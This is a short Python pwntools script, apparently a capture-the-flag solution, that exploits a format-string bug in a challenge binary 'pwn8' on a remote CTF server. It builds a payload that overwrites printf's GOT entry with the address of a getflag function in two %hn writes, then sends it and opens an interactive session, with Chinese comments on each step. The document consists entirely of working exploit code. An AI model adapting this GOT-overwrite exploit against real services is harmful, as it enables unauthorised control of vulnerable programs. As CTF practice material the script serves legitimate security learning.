#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
from pwn import *
context.log_level = 'debug'

#初始化变量 获取数据
#r_program = process('./pwn8')
r_program = remote('ctf.cnss.studio',5008)
program = ELF('pwn8')
got_printf = program.got['printf']
program_getflag = program.symbols['getflag']

#构造shellcode 需要将地址分2次写入
shellcode = ''
shellcode += p32(got_printf)
shellcode += p32(got_printf + 2)
high4 = program_getflag / 0x10000
low4 = program_getflag % 0x10000
shellcode += '%' + str(low4 - 8) +'c%4$hn'
shellcode += '%' + str(0x10000 + high4 - low4) +'c%5$hn'

#发送shellcode
r_program.sendline(shellcode)
r_program.interactive()
